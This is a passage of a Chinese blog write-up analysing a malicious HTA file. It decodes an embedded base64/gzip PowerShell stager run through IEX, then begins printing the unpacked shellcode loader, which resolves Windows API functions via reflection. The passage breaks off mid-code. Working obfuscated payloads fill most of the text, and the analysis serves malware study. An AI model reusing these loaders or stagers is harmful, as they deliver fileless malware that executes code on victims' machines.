AHcAdQBVAE4ATQAvAG8ANQBGAE4AQQBsADcAKwBxAFMAWQA3AEYAMwBuAFQAcgBKACsAZABFAEQASABrAFAAdwBTAHUAZwBCAFAAKwB6AE0ANgBjAGMARgB2AEsASwBxADEASQBIADgARAB1ADkAQQAwADIAdgAxADMARABNADYARQBYADYAZgBMAFMAUwB5ACsANwBwAGUAOAByAGwAaABvADMAQwBzAE0AagAxAEkAegBqAG4AdQBNAGoAcABGAE4AbQBVAEYARABuAFIARABhADMAegBrAGgAZwB4AEwAeAB2AG0ALwAzAFoAWABqAFcAeABtAFkAUgBTAHkAaQA3AGsAVgAvAHcARwBrADUANgAwAGIAbgBnAHMAbgBKAHMASwBRAFgAWQBCAGgAcABQAHMAVQBXADgAaABPAFUAUwBsAHkAYgBZAHYAUQBlAHEASgBiADUAcwBXAEYALwBJAGUAWQBOAEoAQgB0AHcANQBFAEQAUwAzAHYASQBDAGMAeQBrAFcATwBnAHMANQBVAHgAQQBpAHYALwBLAEQANwA2AGsAVQA2AFkANAB2AGsAMABkAGsATQA2AHEAawBHAHcAagBFADIAcgBPACsAVQBSAGwAZABFAE0AbQBKAGYAbAAvADQALwBiAGwAbgBKAHcATwBSAFkAcgBWAEIAYQBSADMAVABnAE0AQgBkAE4AdABqAFIAVwA1AGkAQgBRAHoAcQBXAHIANwA0AEMALwBIACsATwAvAGQAKwBMAGoARQAvAHUAZABrAEkANgBEAG0AUgBoAGUAdwBnAEwAdQBzAEoAUwA0ADkATABKAG8AbgBUAHkAKwBYAHAARABjAHMATQB1AFkAQQBCAGEAbgBMAGcATwBYAFUAVQAwAHIAdQBxAG4AcABXAHgAUQBsADUANABpAEgAWgBLAG8AbQA0AEgAZAAwAEYATAAyAHMAdgB0AFgAVgBzAGEAdwBiAE8ASABSADkAagBKAFUAcQAvAFgARwBmAHIAMQBZAFEAOQBMADAAWABPAC8AWABlADYAcwBsAGMARgBEAHMAeAByAEYAawBSAEsATgA2AG0AVgBCAEwAbwBQAGMAYwBkAGUAUwAxAHMAcgArADIAWgB2AGYAUgBrADcAMQBsAHYAagBLAFgAbwBPADUAOABIADcAWABEAHAAdgBLAHYAaQBtADIASwB6AHQAUAB2AGoATwB0AHgANwBPAGQAawAvADcAQQBpAEcAKwBOAG0AUwBMAGYARwB5ADIANQAyAHAANgBFAGMAaQByAGYAVgB2AFoAMQBlAGQAZAA0ADkARwBEADgAaAA3AEoAdgBlAEIAMwBRAGUANwBqAHoAMwBYAHAATQBxAGwAVABxADMATgBGAFoARAA4AGMAQwBlADYARABJAFAAQwBUAGQAeQBSAGUAOQBmAE4AdQBhAEoARgBwAHYASQB2AG0AYQA3AHAASwBlAGMAVAB1AFEATwA5AHEAeABJAHIARgBEAG0AYgBTAEgAWgBTAEsARgBDAHoATABaAFMAVQBMAGYANgBQAG8AUQBwAHkASwBZACsAcAAzAGIAUwBYAFMAOQBuAHUAQgBYAE4AdABwAGEANgBoAGEAMwB0AFIANwBwADcAaAA1AHEANQBGAGgASgBaAEsAMABLAE8AQgB6ADAAUgBOADMATQA3ADgAZwBCAHoAKwBRAFkAegA3AFIAZQAwAHAANQByAEwAYgBDADcAaQA2AFoAbQB0AGEAMwBxAEEAdABqAFcAeQBTAEUAbQA0AC8AQwA1AE0AMgBKAHoAbwBZACsAYwBhAHAASwA0ADEAWQBhAHkAVgBRADQAOQA3AEwAUABKAHIASABNAFgAbwBLAFQAaAA5AHkAeABxADEATgBjAHMAMQBlADMAMABGAG0AYgBuAFUAVwBJAG4ALwAzAFIAOQBtAEIAQwB3AGIAYgBkAEgAegBTADcAWQBkAGgAdQBxAEMAcgBsAEEATgBaAG0ATwBRAGEAWQBiAFcAbQBEAHIASQBkAGcAcAA0AEcATgB5AHQAOABXAEMARgBxAHYARwBzAEsATwBOAEcAdQByAFUARQBEAHYASAB1AHEATgBaAFcARABCAG4AYQAwAEcAcgAwAGMATgA4ADEAaABDADAAeAA4AFoAbQBhAE0ANQBGAGIAegB3AHoAaQBZAE8AYwB1AG8AVQBIAHQAWgBoAFUATwBtAHgAUgA2AFIAdwBXAGMAYwAwAHkAWgBtAFIASABwAHYANgBCAHUATwBJAHoAcQBTAHgAaQBFAHQAZABzADUARAB3ADYAbwBrAG0AQwBSAGkAdgBzAEsASQBkAEYASwBMAHAAcQBTAHgARQBXAGcANgBFAHQAUABjADkAZgBoADYAMwBSAEIAQwAvAEUAUwBrADIAZABqAHYAMwArAHEASwB5AG8AYwBsAHcAZQBpAFQARQBUAFIAMQBKAHQATgBMAEIASgBkAHoAQgArAGIATABWAEUATABjAEkAdAAzAHgARQBQAG8AUwBZAGQAegBDAGEAQgBmAEEAegBMAGgALwBGAFkAMQBCAGkASgAxAFcAbAB6AHEATQB4AEYAZwBRAHoAMQBWADUATABhAHkAMgB5ADAAUgBGAFUAegBwAGcAdABCAHIATgBUADMAZQBLAEEATwBtADAATgBWAGsAegBmAHEAVwBCAG8ATwB1AGoAMwByAGQAUwBzADcAYwBRAFAASABpACsAMwBjADEAYQBxAHkAOABIAGkAawBzADMAQQBxAHgAKwB5ADQASABuAGoAagBlAFUAdgBzAHkAcwBDAGIAaABlAE8AYgBjADEAZAA2AHgAbQAxAGkARwBWAE4AaQA0AFMAbAArAG4AagB1ADMAQQBuAEkAbgBPAHoAeABiAHgARQAyAFgATwBMAGkATgBuAHgAZABUAGYANwA4AHcAbABUAGEASwBOADAARgBEAC8ALwAvAGoATgA2ADkAMABqAHIAUgBPAC8AcwBDAEMAZgBTADkAdgBjAEEAOABMADUAYQA3AGMAcQBwAHQAZwBuADkAWQByAGkAOQAyADgAMQBUAGsAMAAzAGIAbwBBAHYAcgBwAHoAVgAzAGEAYgBUAG8AZQBSAGkAbgArAEwAWABMAG0AQwB4AFoAcQB3AGcATABXAG0ATQA5AGsAWgBsAFgAbQBqAFgAZwBrAFYARgBBAE0AZQBsAHQAWQByADEAMQBDAGQAQQBFAC8AMQBxAGQAWgBUAGoAcwBEAG4AYwByAGgAVgBLAHUAcQBXAFMATwB4ACsASQB6AFIAYgB3AE0AUABZAEEAYgA0AEEAagA2AHcAdgBiAGkAZgBlAGgAYwBEAFQAUgBHADAAcQBpAFoAWgB5ADkAYwBCAFEAVQBNACsANABlAHIAdQAyAGQANAAyAEIAVgBlADAAYQAyADAAbQA0AHUASwArAHEAVQBWAGQAZwBSAHkAeAB0AFYAQgAxAHkATgBaAEEARwA1AFMASABrAFEAWgBPAEcAMABqAGkAdABEAC8AQQA4AHAAUgBWAHAANwBRAFgAUQBZAHgAegBTAGUALwBzAGYASABQAHoAZgAyAEkAeAA3AHEAegBsAFEAYQBhAEMASQBwAGYATgBmAHYAdgBEAHAAMwBmACsAMgBzAHIAdwArAHIAQwA2ADkAMgB0AHYANwBqAFgARQBBAGEAMABJAHQAcgBWAC8AWgB5AGgANgA5AHEAMQBxAGYATgBVAEEAcQBDAHMASQBOAHMAcQBHAGEAUQBSAE4AegB1AFkASgBrAEwANQBEAFAAcgBVAGoAZgBzADEASwBOAFEAdQBIAGoANwB2AG0AVgBCAGkANgAxAG8AYgBPAEUAMwB2AE4AUwB1AEUAWABiADkAbgBEAGEAUABIADMAUwB4AFUAQQByAGQAMgBxAHcAVgBuAEIAQgBqAFcARQBvAFYARAA0AGMAOABkAHkAYgBJAEgAUgBNAHAANQBpAE0AYQBMADMATwBHAG8AeAB6AGgASgBjACsANgB5AEwANAA5AGUAcwBDAHcAaQB1ACsAQQA3AEYASABYAFoATgB0AGkAbAB6ADUASQBKAFQATAA1AGYAUwAvAFcAdQBaAHoAdgB3ADkATAB3AC8ATwBUAHcAcAB1ADUAWQB0AHAAZwB2AGYAUABrAC8AVQA1ADIAdABoAE4ALwBSAGoAKwBJAFgASQBmACsARAB4AFAAdwAwADYAYgAvAEcAZABvAFUAdgBLAHgASABlADQATQB1AGMAKwBoAGoAdgBQAGgAYwAvAGwAcwB1AHAANgB5ADUAZAAvAE8AaABkAFkAUQB2AEUATAByAGoASABqAEwAdQBoAFUAQgAxAGQAcgBQADEARABQAGgAYwB5AGUANwBmAHcAagBYAGkATwBVAFcAYQBjAGQAZQBJACsAOABIAGQAUQBIAGgAaQBLAEYAVABnAG0AeQBVAHcAbwAvAFEAeQA1AGsANgBmAFkATgArADUARwBGAGsAbgB4AGUALwBjAGsARwBJAEsATABmAFIATgB4AHoATwBBAHAAUgBSADYAcQB0AFIAMABaAGkAUQBWAGgAcgBsAC8AQQB1ADcARABCAGoAUABUAEQAUQBBAEEAIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br><br>var_func<br>self.close<br>&lt;/script&gt;<br><br></code></pre></td></tr></table></figure><p>首先来看hta的源码，使用VBS写的，是一种微软环境下的轻量级的解释型语言，同时它又是asp动态网页默认的编程语言，但这个不是重点，其中最令我们关注的是写入shell命令中的这一长短base64编码的东西，我们先解码看看是什么</p><p><img src="https://s2.loli.net/2022/08/16/4PVe1bmfKvyXRoF.png" alt="base64解码"></p><p>解码完了之后是这一段，把<code>.</code>替换掉，得到这一段代码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$s</span>=<span class="hljs-built_in">New-Object</span> IOMemoryStream(,[<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-string">&quot;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&quot;</span>));<span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> IOStreamReader(<span class="hljs-built_in">New-Object</span> IOCompressionGzipStream(<span class="hljs-variable">$s</span>,[<span class="hljs-type">IOCompressionCompressionMode</span>]::Decompress)))ReadToEnd();<br></code></pre></td></tr></table></figure><p>我们还是先把中间的一长串拿去base64解密，但结果是一堆乱码，可惜<br>那我们来看看其他的<br>其中有这几个函数比较值得关注</p><blockquote><p><code>IOMemoryStream(,[Convert]::FromBase64String())</code>将字符串base64编码后，存入到流中<br><code>IOCompressionGzipStream()</code>使用Gzip压缩<br>最后通过Invoke-Expression（运行一个以字符串形式提供的 Windows PowerShell 表达式）将字符串当作命令执行</p></blockquote><p>网上有现成的脚本，我们直接拿去跑试一下<a href="http://chernodv.blogspot.com.cy/2014/12/powershell-compression-decompression.html">脚本原文链接</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$data</span> = [<span class="hljs-type">System.Convert</span>]::FromBase64String(<span class="hljs-string">&#x27;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&#x27;</span>)<br><span class="hljs-variable">$ms</span> = <span class="hljs-built_in">New-Object</span> System.IO.MemoryStream<br><span class="hljs-variable">$ms</span>.Write(<span class="hljs-variable">$data</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$data</span>.Length)<br><span class="hljs-variable">$ms</span>.Seek(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) | <span class="hljs-built_in">Out-Null</span><br><span class="hljs-variable">$sr</span> = <span class="hljs-built_in">New-Object</span> System.IO.StreamReader(<span class="hljs-built_in">New-Object</span> System.IO.Compression.GZipStream(<span class="hljs-variable">$ms</span>, [<span class="hljs-type">System.IO.Compression.CompressionMode</span>]::Decompress))<br><span class="hljs-variable">$sr</span>.ReadToEnd() | <span class="hljs-built_in">set-clipboard</span><br></code></pre></td></tr></table></figure><p>该脚本首先经过base64解码，然后再进行gzip解压，来得到我们想要看到的hta的源码</p><blockquote><p>这里我犯了一个低级错误，在之前base64解码出来的结果里面，把多余的<code>.</code>都替换掉了，同时也将代码中原本的<code>.</code>也去掉了，故正确的代码应该长这样<br>当时也想到这个问题了，不知道为啥没有注意，挺怪的</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$s</span>=<span class="hljs-built_in">New-Object</span> IO.MemoryStream(,[<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-string">&quot;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&quot;</span>));<span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> IO.StreamReader(<span class="hljs-built_in">New-Object</span> IO.Compression.GzipStream(<span class="hljs-variable">$s</span>,[<span class="hljs-type">IO.Compression.CompressionMode</span>]::Decompress))).ReadToEnd();<br></code></pre></td></tr></table></figure><p>结果会自动保存在剪贴板里<br>得到解压后的源码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-variable">$DoIt</span> = <span class="hljs-string">@&#x27;</span><br><span class="hljs-string">function func_get_proc_address &#123;</span><br><span class="hljs-string">Param ($var_module, $var_procedure)</span><br><span class="hljs-string">$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span><br><span class="hljs-string">$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span><br><span class="hljs-string">return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function func_get_delegate_type &#123;</span><br><span class="hljs-string">Param (</span><br><span class="hljs-string">[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span><br><span class="hljs-string">[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span><br><span class="hljs-string">)</span><br><span 